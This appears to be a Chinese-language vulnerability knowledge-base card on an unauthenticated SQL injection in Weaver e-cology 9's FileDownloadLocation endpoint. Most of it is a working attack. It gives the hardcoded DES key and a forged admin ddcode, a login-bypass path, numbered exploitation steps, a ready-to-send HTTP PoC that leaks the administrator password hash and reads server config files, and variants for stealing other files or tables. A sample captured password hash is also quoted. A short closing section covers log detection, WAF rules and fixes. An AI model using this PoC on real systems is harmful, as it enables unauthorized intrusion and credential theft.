---
id: web-generic-sqli-weaver-e9-filedownloadlocation-union-file-read
title: 泛微 e9 FileDownloadLocation 未授权 SQL 注入：union 控制 emlpath/subject 实现任意文件读取与密码回显
type: scenario
domain: web
path: web/generic/sqli
technique: weaver-e9-filedownloadlocation-union-file-read
aliases:
- 泛微 e9 FileDownloadLocation
- 泛微 e9 文件读取
- 泛微 mailId 注入
- 泛微 e9 union 注入
- emlpath 任意文件读取
- 泛微 e9 管理员密码泄露
tags:
- sqli
- java
- weaver
- ecology
- oa
- union-injection
- arbitrary-file-read
- des
- unauth
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V41
  verified_at: '2026-11-05T06:29:19+08:00'
  notes: 已对照原文与截图核对：ddcode=DES(national,ECB,PKCS5) 明文 1_1、downloadEml SQL、setFilename(subject)/setFilerealpath(emlpath)、singleDownload 写 Content-Disposition 与响应体、实测密码 2DE8C18F8A2E60C3B096370AE9812915 与 mobilemode.properties 回显均与卡片一致；affected_versions 原为分析环境版本，已清除。未实际复现。
---

## 一句话结论

泛微 e9 的 `/weaver/weaver.email.FileDownloadLocation` 在 `/login/LoginSSOxjsp` 路径绕过登录与参数过滤后，把 `mailId` 直接拼进 `MailResource` 查询；用 `union select` 控制 `emlpath` 和 `subject` 两列，就能让 `singleDownload` 把任意本地文件写入响应体、把注入子查询的结果写进 `Content-Disposition` 的 filename，未授权读取服务器文件并回显管理员密码。

## 原理

- 入口 `FileDownloadLocation#doGet` 先从 `ddcode` 取用户：`DesUtils.decrypt(ddcode)` 后按 `_` 分割，第一段转 int 作为 `User` id；`DesUtils` 使用硬编码密钥 `national`，DES/ECB/PKCS5，因此可自行构造 `1_1` 对应管理员 `User(1)`，只要用户存在，`var3 != null`，就不会重定向到登录页。
- 当 `downfiletype=eml` 时进入 `downloadEml(mailId, ...)`。核心 SQL 形如 `select haseml, emlpath, emlName, subject, folderid, id from MailResource where id = <mailId> and (...)`，`mailId` 来自 `getParameter` 且直接拼接，没有参数化。
- `downloadEml` 取结果集后执行 `setFilename(null2String(rs.getString("subject")))` 与 `setFilerealpath(null2String(rs.getString("emlpath")))`；`singleDownload` 再把 filename 写入 `Content-Disposition`，并用 `new FileInputStream(new File(filerealpath))` 读取文件写入响应体。
- 因此一次 `union select` 可同时控制两个输出通道：`subject` 列放 `(select password from HrmResourceManager where id=1)`，密码出现在响应头 filename；`emlpath` 列放 `../ecology/WEB-INF/prop/mobilemode.properties` 一类相对路径，文件内容出现在响应体。
- 能注入的前提是参数未被 `HTMLFilter` 全角化，依赖 `/login/LoginSSOxjsp` 路径同时绕过 `isLogin` 与 `isXssFilter`（见关联卡片）。
- 该接口按 `/weaver/*` 路由映射，`/login/LoginSSOxjsp/x.FileDownloadLocation` 只是 servlet 的 `pathInfo`，不参与方法分派，因此可任意加长而不影响到达 `doGet`。

## 触发条件

- 目标为泛微 e-cology 9（原文环境 9.00.210804 v10.42），存在 `weaver.email.FileDownloadLocation` servlet。
- 攻击者能访问 `/weaver/*` 且能构造 `ddcode`（DES 密钥硬编码为 `national`），或目标存在可用的管理员用户 id。
- 数据库为 MySQL，`MailResource` 表的列顺序与查询一致（`haseml, emlpath, emlName, subject, folderid, id`），可被 `union select` 对齐。
- `mailId` 的原始值需为数字，后接 `union select ...`；`id` 条件与外层 `and (...)` 需通过注释或恒真条件闭合。
- `emlpath` 指向的文件在服务进程工作目录下可解析且存在。

## 利用步骤

1. 用 DES/ECB/PKCS5、key=`national` 加密明文 `1_1`，得到 `ddcode`（原文值 `7ea7ef3c41d67297`），确保 `User(1)` 存在。
2. 在 servlet 路径后插入 `/login/LoginSSOxjsp`，绕过登录与 `getParameter` 过滤。
3. 取一个存在的 `MailResource.id`（原文用 1123）作为 `mailId` 前缀，后接 `union select`。
4. union 子查询按列顺序构造 6 列：`1 as resourceid`、文件路径 as `x2`（对应 emlpath）、`'3' as x3`（emlName）、密码子查询 as `x4`（对应 subject）、`5 as x5`（folderid）、`6 as x6`（id）。
5. 发送请求，检查响应头 `Content-Disposition: attachment; filename="<密码>"` 和响应体中的文件内容。
6. 若要读其他文件，替换 x2 的路径；若要取其他数据，替换 x4 的子查询。

## PoC

```http
GET /weaver/weaver.email.FileDownloadLocation/login/LoginSSOxjsp/x.FileDownloadLocation?ddcode=7ea7ef3c41d67297&downfiletype=eml&download=1&mailId=1123+union+select+*+from+(select+1+as+resourceid,'../ecology/WEB-INF/prop/mobilemode.properties'+as+x2,'3'+as+x3,(select++*+from+(select+*+from+(select+password+from+HrmResourceManager+where+id=1)x)x)+as+x4,5+as+x5,6+as+x6)x+where+1=1&mailid=action.WorkflowFnaEffectNew&parentid=0 HTTP/1.1
Host: target:8060
Content-Type: charset=UTF-8
```

实际执行的 SQL：

```sql
select haseml, emlpath, emlName, subject, folderid, id
from MailResource where id = 1123
union select * from (
  select 1 as resourceid,
         '../ecology/WEB-INF/prop/mobilemode.properties' as x2,
         '3' as x3,
         (select * from (select * from (select password from HrmResourceManager where id=1)x)x) as x4,
         5 as x5, 6 as x6
)x where 1=1 and ((resourceid in (1)))
```

结果：`Content-Disposition` 的 filename 为 `HrmResourceManager.id=1` 的密码；响应体为 `mobilemode.properties` 内容。原文截图中密码 `2DE8C18F8A2E6...` 与数据库查询结果一致。

## 变体与关联

- 仅做文件读取：把 x4 换成任意常量，响应体即目标文件；可尝试 `../ecology/WEB-INF/prop/*`、配置文件、日志等。
- 仅做数据回显：把 x2 换成存在的任意文件，密码仍在 filename 中；也可把其他表/字段子查询放入 x4。
- `ddcode` 的明文第二段可任意；若目标管理员 id 不是 1，改成对应 id 并重算 DES。
- 关联：[[web-generic-auth-weaver-e9-islogin-xsslist-regex-bypass]]（`/login/LoginSSOxjsp` 绕过登录和 HTMLFilter 是该链的前置条件）。
- 关联：[[web-generic-sqli-metinfo-search-para-base64-blind]]（同为产品级未授权 SQL 注入，但本例是 union 直接回显并叠加文件读取）。

## 检测与防御

- **日志检测**：`/weaver/` 路径中出现 `/login/` 中间段；`mailId` 含 `union`、`select`、`from`、`HrmResourceManager`；响应头 `Content-Disposition` 的 filename 出现非预期值或数据库字段内容；同一 `ddcode` 被高频复用。
- **WAF**：对 `mailId` 做数字校验，出现空格、引号、`union`、注释符即拒绝；不能只依赖 `HTMLFilter` 的全角化。
- **修复**：`mailId` 改为预编译参数或强制 `int` 转换；`downloadEml` 不接受用户可控的 `emlpath`，文件路径应从数据库固定字段读取并做白名单校验；`ddcode` 的密钥不应硬编码，且校验用户会话与文件归属。
- **加固**：升级到修复版本；限制 `WEB-INF/prop` 等敏感目录对 Web 进程的可读性；对下载接口增加登录态与越权校验。
